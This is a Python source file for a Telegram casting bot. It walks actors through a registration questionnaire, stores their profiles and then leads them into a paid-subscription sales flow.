from aiogram.types import Message, CallbackQuery
from aiogram import F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext

from loader import base, techno_dict
from utils.users_router import users_router
from utils.user_bot_parser import check_paid
from states import ActorsState
from keyboards.reply import main_menu_actor
from keyboards.inline_actors import (sex_choice, education_choice, experience_choice,
                                     role_interested, editor_keyboard, paid_url, first_start, first_answer,
                                     i_want_2, i_want_1, i_want_5, pay_page)


@users_router.message(Command('start'))
async def start_func(msg: Message):
    """–ó–∞–ø—É—Å–∫–∞–µ–º –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ —Å –±–æ—Ç–æ–º –∏ –¥–∞–µ–º —Ä–æ–ª—å –Ω–∞ –≤—ã–±–æ—Ä: –∞–∫—Ç–µ—Ä –∏–ª–∏ –∫–∞—Å—Ç–∏–Ω–≥-–¥–∏—Ä–µ–∫—Ç–æ—Ä"""
    if msg.from_user.id in await base.get_users_id():
        await msg.answer('–í—ã–±–µ—Ä–µ—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:', reply_markup=main_menu_actor)
        if not await check_paid(msg.from_user.id):
            await msg.answer('–î–ª—è —Ç–æ–≥–æ —á—Ç–æ –±—ã –ø–æ–ª—É—á–∞—Ç—å —Ä–∞—Å—Å—ã–ª–∫—É –∏–∑ —Ä–µ–ª–µ–≤–∞–Ω—Ç–Ω—ã—Ö –∫–∞—Å—Ç–∏–Ω–≥–æ–≤ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ–ø–ª–∞—Ç–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É!')
    else:
        await msg.answer('–ü—Ä–∏–≤–µ—Ç! –Ø ‚Äì –≤–∞—à –ø–æ–º–æ—â–Ω–∏–∫ –≤ –º–∏—Ä–µ –∫–∏–Ω–æ, —Ç–µ–∞—Ç—Ä–∞ –∏ —Ä–µ–∫–ª–∞–º—ã. –ú–æ—è –º–∏—Å—Å–∏—è ‚Äî –ø–æ–º–æ–≥–∞—Ç—å –∞–∫—Ç—ë—Ä–∞–º '
                         '–Ω–∞—Ö–æ–¥–∏—Ç—å —Ä–æ–ª–∏, –∞ –∫–∞—Å—Ç–∏–Ω–≥-–¥–∏—Ä–µ–∫—Ç–æ—Ä–∞–º –ø—É–±–ª–∏–∫–æ–≤–∞—Ç—å –∫–∞—Å—Ç–∏–Ω–≥–∏ –∏ –∏—Å–∫–∞—Ç—å –ø–æ–¥—Ö–æ–¥—è—â–∏—Ö –∏—Å–ø–æ–ª–Ω–∏—Ç–µ–ª–µ–π.')
        await msg.answer('\n–ö—Ç–æ –≤—ã?', reply_markup=first_start)


@users_router.callback_query(F.data == 'actor')
async def start_actor_registration(callback: CallbackQuery):
    """–ù–∞—á–∞–ª–æ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –∞–∫—Ç–µ—Ä–∞"""
    await callback.answer()
    await callback.message.answer('–ö–ª–∞—Å—Å, –ª—é–±–ª—é —Ä–∞–±–æ—Ç–∞—Ç—å —Å –∞–∫—Ç—ë—Ä–∞–º–∏. –ü–æ—Ç–æ–º—É —á—Ç–æ –∫—Ç–æ-—Ç–æ –∏–∑ –Ω–∏—Ö —Ä–∞–Ω–æ '
                                  '–∏–ª–∏ –ø–æ–∑–¥–Ω–æ —Ç–æ—á–Ω–æ —Å—Ç–∞–Ω–µ—Ç –∑–Ω–∞–º–µ–Ω–∏—Ç—ã–ºüòé')
    await callback.message.answer('–•–æ—á–µ—à—å, —è –±—É–¥—É –ø–æ–¥–±–∏—Ä–∞—Ç—å —Ç–µ–±–µ —Ü–µ–ª–µ–≤—ã–µ –∫–∞—Å—Ç–∏–Ω–≥–∏ –ø–æ –ø–æ–ª—É, –≤–æ–∑—Ä–∞—Å—Ç—É –∏ —Ç–∏–ø—É –ø—Ä–æ–µ–∫—Ç–∞?',
                                  reply_markup=first_answer)


@users_router.callback_query(F.data == 'reg_start')
async def registration_first_step(callback: CallbackQuery, state: FSMContext):
    """–ó–∞–±–∞–≤–Ω—ã–π –¥–∏–∞–ª–æ–≥"""
    await callback.answer()
    await state.set_state(ActorsState.actor_name)
    await callback.message.answer(
        '–¢–µ–ø–µ—Ä—å —Ç–µ–±–µ –±–æ–ª—å—à–µ –Ω–µ –ø—Ä–∏–¥—ë—Ç—Å—è —Ç—Ä–∞—Ç–∏—Ç—å —Å–≤–æ—ë –≤—Ä–µ–º—è, –ª–∏—Å—Ç–∞—è –º–∏–ª–ª–∏–æ–Ω—ã —á–∞—Ç–æ–≤ –≤ –ø–æ–∏—Å–∫–∞—Ö "—Ç–æ–π —Å–∞–º–æ–π" '
        '—Ä–æ–ª–∏. –Ø —ç—Ç–æ —Å–¥–µ–ª–∞—é –∑–∞ —Ç–µ–±—è.')
    await callback.message.answer(
        '–ù–∞—á–Ω—ë–º –ø–æ–¥–±–∏—Ä–∞—Ç—å —Ç–µ–±–µ –∫–∞—Å—Ç–∏–Ω–≥–∏?\n–ó–∞–ø–æ–ª–Ω–∏, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–µ–±–µ, —á—Ç–æ–±—ã —è –¥–æ–±–∞–≤–∏–ª —Ç–µ–±—è –≤ '
        '–Ω–∞—à—É <b>–∞–∫—Ç–µ—Ä—Å–∫—É—é –±–∞–∑—É</b> –∏ –ø–æ–Ω–∏–º–∞–ª, –∫–∞–∫–∏–µ —Ä–æ–ª–∏ —Ç–µ–±–µ –ø—Ä–µ–¥–ª–∞–≥–∞—Ç—å.')
    await callback.message.answer('–í–≤–µ–¥–∏ —Å–≤–æ–µ –§–ò–û:')


@users_router.message(ActorsState.actor_name)
async def name_saver(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–º—è –∏ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –≤–æ–ø—Ä–æ—Å—É"""
    await state.set_data({'actor_name': msg.text})
    await msg.answer('–í—ã–±–µ—Ä–∏ –ø–æ–ª:', reply_markup=sex_choice)
    await state.set_state(ActorsState.sex)


@users_router.callback_query(ActorsState.sex, F.data.startswith('sex_'))
async def name_saver(callback: CallbackQuery, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–æ–ª –∏ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –≤–æ–ø—Ä–æ—Å—É"""
    await callback.answer()
    await state.update_data({'sex': callback.data.replace('sex_', '')})
    await callback.message.answer('–í–æ–∑—Ä–∞—Å—Ç –ø–æ –ø–∞—Å–ø–æ—Ä—Ç—É')
    await state.set_state(ActorsState.passport_age)


@users_router.message(ActorsState.passport_age)
async def passport_age_saver(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –≤–æ–∑—Ä–∞—Å—Ç –ø–æ –ø–∞—Å–ø–æ—Ä—Ç—É –∏ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –≤–æ–ø—Ä–æ—Å—É"""
    try:
        await state.update_data({'passport_age': int(msg.text)})
        await msg.answer('–ò–≥—Ä–æ–≤–æ–π –≤–æ–∑—Ä–∞—Å—Ç (–¥–∏–∞–ø–∞–∑–æ–Ω, –∫–æ—Ç–æ—Ä—ã–π –≤—ã –º–æ–∂–µ—Ç–µ –∏–≥—Ä–∞—Ç—å —á–µ—Ä–µ–∑ –¥–µ—Ñ–∏—Å)')
        await state.set_state(ActorsState.playing_age)
    except ValueError:
        await msg.answer('–û—à–∏–±–∫–∞ –≤–≤–æ–¥–∞!\n–í–≤–µ–¥–∏—Ç–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ!')


@users_router.message(ActorsState.playing_age)
async def playing_age_saver(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–≥—Ä–æ–≤–æ–π –≤–æ–∑—Ä–∞—Å—Ç –∏ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –≤–æ–ø—Ä–æ—Å—É"""
    try:
        playing_age = [int(a) for a in msg.text.split('-')]
        if len(playing_age) != 2:
            raise ValueError
        await state.update_data({'playing_age': msg.text})
        await msg.answer('–ï—Å—Ç—å –ª–∏ —É –≤–∞—Å –ø—Ä–æ—Ñ.–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ?', reply_markup=education_choice)
        await state.set_state(ActorsState.education)
    except ValueError:
        await msg.answer('–û—à–∏–±–∫–∞ –≤–≤–æ–¥–∞!\n–í–≤–µ–¥–∏—Ç–µ –¥–∏–∞–ø–∞–∑–æ–Ω, –∫–æ—Ç–æ—Ä—ã–π –≤—ã –º–æ–∂–µ—Ç–µ –∏–≥—Ä–∞—Ç—å —á–µ—Ä–µ–∑ –¥–µ—Ñ–∏—Å')


@users_router.callback_query(ActorsState.education, F.data.startswith('educ_'))
async def education_saver(callback: CallbackQuery, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –∏ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –≤–æ–ø—Ä–æ—Å—É"""
    await callback.answer()
    await state.update_data({'education': callback.data.replace('educ_', '')})
    await callback.message.answer('–ï—Å—Ç—å –ª–∏ –æ–ø—ã—Ç –≤ —Å—ä–µ–º–∫–∞—Ö?', reply_markup=experience_choice)
    await state.set_state(ActorsState.have_experience)


@users_router.callback_query(ActorsState.have_experience, F.data.startswith('exp_'))
async def experience_saver(callback: CallbackQuery, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–ø—ã—Ç –∏ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –≤–æ–ø—Ä–æ—Å—É"""
    await callback.answer()
    await state.update_data({'have_experience': callback.data.replace('exp_', '')})
    await callback.message.answer('–ï—Å—Ç—å –ª–∏ —É —Ç–µ–±—è –∞–∫—Ç—ë—Ä—Å–∫–æ–µ –ø–æ—Ä—Ç—Ñ–æ–ª–∏–æ (—Ñ–æ—Ç–æ, –≤–∏–¥–µ–æ-–≤–∏–∑–∏—Ç–∫–∞)?\n'
                                  '–°—Å—ã–ª–∫–∞ –Ω–∞ –ø—Ä–æ—Ñ.—Ä–µ—Å—É—Ä—Å/—è–Ω–¥–µ–∫—Å-–¥–∏—Å–∫.')
    await state.set_state(ActorsState.portfolio)


@users_router.message(ActorsState.portfolio)
async def portfolio_saver(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–æ—Ä—Ç—Ñ–æ–ª–∏–æ –∏ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –≤–æ–ø—Ä–æ—Å—É"""
    await state.update_data({'portfolio': msg.text})
    await msg.answer('–í–µ–¥—ë—à—å –ª–∏ —Ç—ã —Å–æ—Ü.—Å–µ—Ç–∏? –ü—Ä–∏–∫—Ä–µ–ø–∏ —Å—Å—ã–ª–∫—É –Ω–∞ —Å–≤–æ—é —Å—Ç—Ä–∞–Ω–∏—á–∫—É')
    await state.set_state(ActorsState.social)


@users_router.message(ActorsState.social)
async def social_saver(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Ü. —Å–µ—Ç–∏ –∏ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –≤–æ–ø—Ä–æ—Å—É"""
    await state.update_data({'social': msg.text})
    await msg.answer('–£–∫–∞–∂–∏—Ç–µ <b>–º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π</b> –≥–æ–Ω–æ—Ä–∞—Ä –≤ —Ä—É–±–ª—è—Ö:\n<blockquote>–¶–∏—Ñ—Ä—ã –ø–æ —Ä—ã–Ω–∫—É:\n'
                     '‚Äì –ì–æ–Ω–æ—Ä–∞—Ä –∞–∫—Ç—ë—Ä–æ–≤ –º–∞—Å—Å–æ–≤—ã—Ö –∏ –≥—Ä—É–ø–ø–æ–≤—ã—Ö —Å—Ü–µ–Ω –æ–±—ã—á–Ω–æ –æ—Ç 1.500‚ÇΩ –¥–æ 5.000‚ÇΩ\n'
                     '‚Äì –ì–æ–Ω–æ—Ä–∞—Ä –∑–∞ —ç–ø–∏–∑–æ–¥–∏—á–µ—Å–∫—É—é —Ä–æ–ª—å –æ—Ç 7.000‚ÇΩ –¥–æ 30.000‚ÇΩ\n'
                     '‚Äì –ì–æ–Ω–æ—Ä–∞—Ä –∑–∞ —Å—ä–µ–º–∫—É –≤ —Ä–µ–∫–ª–∞–º–µ –æ—Ç 25.000‚ÇΩ –¥–æ 300.000</blockquote>')
    await state.set_state(ActorsState.fee)


@users_router.message(ActorsState.fee)
async def fee_saver(msg: Message, state: FSMContext):
    """–°–æ—Ö—Ä–∞–Ω—è–µ–º –≥–æ–Ω–æ—Ä–∞—Ä –∏ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –≤–æ–ø—Ä–æ—Å—É"""
    try:
        await state.update_data({'fee': int(msg.text), 'projects_interest': []})  # –ü—É—Å—Ç–æ–π —Å–ø–∏—Å–æ–∫ –Ω—É–∂–µ–Ω –¥–∞–ª—å—à–µ
        await msg.answer('–í—ã–±–µ—Ä–∏ –∏–∑ —Å–ø–∏—Å–∫–∞ —Ç–æ, —á—Ç–æ —Ç–µ–±—è –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç (–º–æ–∂–Ω–æ –≤—ã–±—Ä–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤):',
                         reply_markup=role_interested)
        await state.set_state(ActorsState.roles_type_interest)
    except ValueError:
        await msg.answer('–ù—É–∂–Ω–æ –≤–≤–µ—Å—Ç–∏ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ!')


# –°–ª–æ–≤–∞—Ä—å —Å–æ –∑–Ω–∞—á–µ–Ω–∏—è–º–∏ –¥–ª—è —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π
dict_for_msg_build = {
    # –†–æ–ª–∏
    'films': '–ö–∞—Å—Ç–∏–Ω–≥–∏ –≤ –∫–∏–Ω–æ',
    'series': '–ö–∞—Å—Ç–∏–Ω–≥ –≤ —Å–µ—Ä–∏–∞–ª',
    'ads': '–ö–∞—Å—Ç–∏–Ω–≥–∏ –≤ —Ä–µ–∫–ª–∞–º—É',
    'theater': '–¢–µ–∞—Ç—Ä–∞–ª—å–Ω—ã–µ –ø—Ä–æ–µ–∫—Ç—ã',
    'main_role': '–ì–ª–∞–≤–Ω—ã–µ –∏ –≤—Ç–æ—Ä–æ—Å—Ç–µ–ø–µ–Ω–Ω—ã–µ —Ä–æ–ª–∏',
    'episode': '–≠–ø–∏–∑–æ–¥—ã',
    'mass': '–ì—Ä—É–ø–ø–æ–≤–∫–∞/–º–∞—Å—Å–æ–≤–∫–∞',
    'free': '–ù–µ–∫–æ–º–º–µ—Ä—á–µ—Å–∫–∏–µ –ø—Ä–æ–µ–∫—Ç—ã / —Ñ–µ—Å—Ç–∏–≤–∞–ª—å–Ω—ã–µ –∫–æ—Ä–æ—Ç–∫–æ–º–µ—Ç—Ä–∞–∂–Ω—ã–µ —Ñ–∏–ª—å–º—ã –º–æ–ª–æ–¥—ã—Ö —Ä–µ–∂–∏—Å—Å—ë—Ä–æ–≤',
    # –û–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ
    'vuz': '–ü–æ–ª—É—á–∏–ª –¥–∏–ø–ª–æ–º. –≥–æ—Å. –æ–±—Ä–∞–∑—Ü–∞',
    'curs': '–ü—Ä–æ—à—ë–ª –∫—É—Ä—Å—ã –∞–∫—Ç–µ—Ä—Å–∫–æ–≥–æ –º–∞—Å—Ç–µ—Ä—Å—Ç–≤–∞',
    'none': '–ê–∫—Ç–µ—Ä—Å–∫–æ–≥–æ –æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –Ω–µ—Ç',
    # –û–ø—ã—Ç
    'null': '–û–ø—ã—Ç–∞ –Ω–µ—Ç, —è - –Ω–æ–≤–∏—á–æ–∫',
    'ads_': '–°–Ω–∏–º–∞–ª–∞—Å—å(—Å—è) —Ç–æ–ª—å–∫–æ –≤ —Ä–µ–∫–ª–∞–º–µ / –º–∞—Å—Å–æ–≤–∫–∞—Ö/–≥—Ä—É–ø–ø–æ–≤–∫–∞—Ö',
    'free_': '–°–Ω–∏–º–∞–ª–∞—Å—å(—Å—è) –≤ —ç–ø–∏–∑–æ–¥–∞—Ö / –Ω–µ–∫–æ–º–º–µ—Ä—á–µ—Å–∫–∏—Ö –ø—Ä–æ–µ–∫—Ç–∞—Ö',
    'main': '–ï—Å—Ç—å –≤—Ç–æ—Ä–æ—Å—Ç–µ–ø–µ–Ω–Ω—ã–µ / –≥–ª–∞–≤–Ω—ã–µ —Ä–æ–ª–∏ –≤ –ø–æ–ª–Ω–æ–º–µ—Ç—Ä–∞–∂–Ω—ã—Ö —Ñ–∏–ª—å–º–∞—Ö/—Å–µ—Ä–∏–∞–ª–∞—Ö',
    # –ü–æ–ª
    'male': '–ú—É–∂—Å–∫–æ–π',
    'female': '–ñ–µ–Ω—Å–∫–∏–π'
}


@users_router.callback_query(ActorsState.roles_type_interest, F.data != 'ready')
async def roles_type_saver(callback: CallbackQuery, state: FSMContext):
    """–õ–æ–≤–∏–º –≤—ã–±–æ—Ä –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏—Ö —Ä–æ–ª–µ–π"""
    await callback.answer()

    msg_text = '–í—ã–±–µ—Ä–∏ –∏–∑ —Å–ø–∏—Å–∫–∞ —Ç–æ, —á—Ç–æ —Ç–µ–±—è –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç (–º–æ–∂–Ω–æ –≤—ã–±—Ä–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤)\n–£–∂–µ –≤—ã–±—Ä–∞–Ω–æ:\n\n'

    projects_interest: list = (await state.get_data())['projects_interest']

    projects_choice = callback.data.replace('choice_', '')

    if projects_choice not in projects_interest:
        projects_interest.append(projects_choice)
    else:
        projects_interest.remove(projects_choice)

    for elem in projects_interest:
        msg_text += dict_for_msg_build[elem] + '\n'

    msg_text += '\n–ù–∞–∂–º–∏—Ç–µ –ø–æ–≤—Ç–æ—Ä–Ω–æ —á—Ç–æ –±—ã —É–±—Ä–∞—Ç—å –≤—ã–±—Ä–∞–Ω–Ω–æ–µ\n–ù–∞–∂–º–∏—Ç–µ "–ì–æ—Ç–æ–≤–æ" —á—Ç–æ –±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å'
    await state.update_data({'projects_interest': projects_interest})
    await callback.message.edit_text(msg_text, reply_markup=role_interested)


@users_router.callback_query(ActorsState.roles_type_interest, F.data == 'ready')
async def review_all_data(callback: CallbackQuery, state: FSMContext):
    """–í—ã–≤–æ–¥–∏–º –≤—Å–µ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏ –¥–∞–µ–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∏—Å–ø—Ä–∞–≤–∏—Ç—å"""
    await callback.answer()
    actor_data = await state.get_data()
    if len(actor_data["projects_interest"]) > 0:
        msg_text = (f'–ü—Ä–æ–≤–µ—Ä—å –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –≤–≤–µ–¥–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö:\n\n'
                    f'<b>–§–ò–û:</b> {actor_data["actor_name"]}\n'
                    f'<b>–ü–æ–ª:</b> {dict_for_msg_build[actor_data["sex"]]}\n'
                    f'<b>–í–æ–∑—Ä–∞—Å—Ç –ø–æ –ø–∞—Å–ø–æ—Ä—Ç—É:</b> {actor_data["passport_age"]}\n'
                    f'<b>–ò–≥—Ä–æ–≤–æ–π –≤–æ–∑—Ä–∞—Å—Ç:</b> {actor_data["playing_age"]}\n'
                    f'<b>–û–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ:</b> {dict_for_msg_build[actor_data["education"]]}\n'
                    f'<b>–û–ø—ã—Ç:</b> {dict_for_msg_build[actor_data["have_experience"]]}\n'
                    f'<b>–ü–æ—Ä—Ç—Ñ–æ–ª–∏–æ:</b> {actor_data["portfolio"]}\n'
                    f'<b>–°–æ—Ü. —Å–µ—Ç–∏:</b> {actor_data["social"]}\n'
                    f'<b>–ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –≥–æ–Ω–æ—Ä–∞—Ä:</b> {actor_data["fee"]}\n'
                    f'<b>–¢–æ, —á—Ç–æ –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç:</b> {", ".join([dict_for_msg_build[a] for a in actor_data["projects_interest"]])}')
        await callback.message.answer(msg_text, reply_markup=editor_keyboard)
        await callback.message.answer('–ï—Å–ª–∏ –≤—Å–µ –≤–µ—Ä–Ω–æ –Ω–∞–∂–º–∏—Ç–µ "–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è"')
        await state.set_state(ActorsState.preview)
    else:
        await callback.message.answer('–ù—É–∂–Ω–æ –≤—ã–±—Ä–∞—Ç—å —Ö–æ—Ç—è –±—ã –æ–¥–∏–Ω –∏–Ω—Ç–µ—Ä–µ—Å!')


async def review_all_data_after_edit(msg: Message, state: FSMContext):
    """–í—ã–≤–æ–¥–∏–º –≤—Å–µ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏ –¥–∞–µ–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∏—Å–ø—Ä–∞–≤–∏—Ç—å"""
    actor_data = await state.get_data()
    msg_text = (f'–ü—Ä–æ–≤–µ—Ä—å –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –≤–≤–µ–¥–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö:\n\n'
                f'<b>–§–ò–û:</b> {actor_data["actor_name"]}\n'
                f'<b>–ü–æ–ª:</b> {dict_for_msg_build[actor_data["sex"]]}\n'
                f'<b>–í–æ–∑—Ä–∞—Å—Ç –ø–æ –ø–∞—Å–ø–æ—Ä—Ç—É:</b> {actor_data["passport_age"]}\n'
                f'<b>–ò–≥—Ä–æ–≤–æ–π –≤–æ–∑—Ä–∞—Å—Ç:</b> {actor_data["playing_age"]}\n'
                f'<b>–û–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ:</b> {dict_for_msg_build[actor_data["education"]]}\n'
                f'<b>–û–ø—ã—Ç:</b> {dict_for_msg_build[actor_data["have_experience"]]}\n'
                f'<b>–ü–æ—Ä—Ç—Ñ–æ–ª–∏–æ:</b> {actor_data["portfolio"]}\n'
                f'<b>–°–æ—Ü. —Å–µ—Ç–∏:</b> {actor_data["social"]}\n'
                f'<b>–ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –≥–æ–Ω–æ—Ä–∞—Ä:</b> {actor_data["fee"]}\n'
                f'<b>–¢–æ, —á—Ç–æ –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç:</b> {", ".join([dict_for_msg_build[a] for a in actor_data["projects_interest"]])}')
    await msg.answer(msg_text, reply_markup=editor_keyboard)
    await msg.answer('–ï—Å–ª–∏ –≤—Å–µ –≤–µ—Ä–Ω–æ –Ω–∞–∂–º–∏—Ç–µ "–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è"')
    await state.set_state(ActorsState.preview)


@users_router.callback_query(ActorsState.preview, F.data == 'registration')
async def registry_new_actor(callback: CallbackQuery, state: FSMContext):
    """–†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –Ω–æ–≤–æ–≥–æ –∞–∫—Ç–µ—Ä–∞"""
    await callback.answer()
    actor_data = await state.get_data()
    await base.registry_new_actor(
        user_id=callback.from_user.id,
        actor_name=actor_data['actor_name'],
        passport_age=actor_data['passport_age'],
        playing_age=actor_data['playing_age'],
        education=actor_data['education'],
        sex=actor_data['sex'],
        have_experience=actor_data['have_experience'],
        fee=actor_data['fee'],
        portfolio=actor_data['portfolio'],
        social=actor_data['social'],
        projects_interest='+'.join(actor_data['projects_interest'])
    )
    await state.clear()
    await callback.message.answer(
        '–û—Ç–ª–∏—á–Ω–æ! –¢–µ–ø–µ—Ä—å —è –ø–æ–Ω–∏–º–∞—é, –∫–∞–∫–∏–µ –∫–∞—Å—Ç–∏–Ω–≥–∏ —Ç–µ–±–µ –ø–æ–¥–æ–π–¥—É—Ç –∏ –≥–æ—Ç–æ–≤ –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å –∏ –ø—Ä–∏—Å—ã–ª–∞—Ç—å –∏—Ö '
        '—Ç–µ–±–µ –∏ –¥–Ω—ë–º –∏ –Ω–æ—á—å—é.\n–í—ã–±–µ—Ä–∏ –ø–æ–¥—Ö–æ–¥—è—â–∏–π –≤–∞—Ä–∏–∞–Ω—Ç –Ω–∞—à–µ–≥–æ –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è:\n'
        '<blockquote> –ø—Ä–∏–æ–±—Ä–µ—Ç–∞—è –ø–∞–∫–µ—Ç, –≤—ã –ø—Ä–∏–Ω–∏–º–∞–µ—Ç–µ <a href="https://disk.yandex.ru/d/y1EoKJjeqvqv2w">'
        '–æ—Ñ–µ—Ä—Ç—É</a> –∏ —Å–æ–≥–ª–∞—à–∞–µ—Ç–µ—Å—å —Å '
        '<a href="https://disk.yandex.ru/d/rUAPTKcfIRVegQ">–ø–æ–ª–∏—Ç–∏–∫–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–∏ –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö</a></blockquote>',
        reply_markup=await pay_page(callback.from_user.id))
    await techno_dict['sales_funnel'].first_step(user_id=str(callback.from_user.id), message=callback.message)


@users_router.callback_query(F.data == 'i_want')
async def get_pay_page_2(callback: CallbackQuery):
    """–ü–æ—Å–ª–µ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –≤–æ—Ä–æ–Ω–∫–∏ –ø—Ä–æ–¥–∞–∂"""
    await callback.answer()
    await callback.message.answer(
        '–í—ã–±–µ—Ä–∏ –ø–æ–¥—Ö–æ–¥—è—â–∏–π –≤–∞—Ä–∏–∞–Ω—Ç –Ω–∞—à–µ–≥–æ –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è:\n'
        '<blockquote> –ø—Ä–∏–æ–±—Ä–µ—Ç–∞—è –ø–∞–∫–µ—Ç, –≤—ã –ø—Ä–∏–Ω–∏–º–∞–µ—Ç–µ <a href="https://disk.yandex.ru/d/y1EoKJjeqvqv2w">'
        '–æ—Ñ–µ—Ä—Ç—É</a> –∏ —Å–æ–≥–ª–∞—à–∞–µ—Ç–µ—Å—å —Å '
        '<a href="https://disk.yandex.ru/d/rUAPTKcfIRVegQ">–ø–æ–ª–∏—Ç–∏–∫–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–∏ –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö</a></blockquote>',
        reply_markup=await pay_page(callback.from_user.id))


@users_router.callback_query(F.data == 'i_can')
async def answer_1(callback: CallbackQuery):
    """–û—Ç–≤–µ—Ç –Ω–∞ –ø–µ—Ä–≤–æ–µ –≤–æ–∑—Ä–∞–∂–µ–Ω–∏–µ"""
    await callback.answer()
    msg_text = ('–î–∞–≤–∞–π –ø–æ—Å—á–∏—Ç–∞–µ–º. –ï—Å–ª–∏ —Ç—ã —Ç—Ä–∞—Ç–∏—à—å —Ö–æ—Ç—è –±—ã <b>2 —á–∞—Å–∞ –≤ –¥–µ–Ω—å</b> –Ω–∞ –ø–æ–∏—Å–∫ –∫–∞—Å—Ç–∏–Ω–≥–æ–≤, —ç—Ç–æ —É–∂–µ <b>60 '
                '—á–∞—Å–æ–≤ –≤ –º–µ—Å—è—Ü.</b>'
                '–≠—Ç–∏ —á–∞—Å—ã —Ç—ã –º–æ–≥(–ª–∞) –±—ã –ø–æ—Ç—Ä–∞—Ç–∏—Ç—å –Ω–∞ —Ä–µ–ø–µ—Ç–∏—Ü–∏–∏, –ø—Ä–æ–∫–∞—á–∫—É —Å–≤–æ–∏—Ö –∞–∫—Ç–µ—Ä—Å–∫–∏—Ö –Ω–∞–≤—ã–∫–æ–≤ –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –æ—Ç–¥—ã—Ö.'
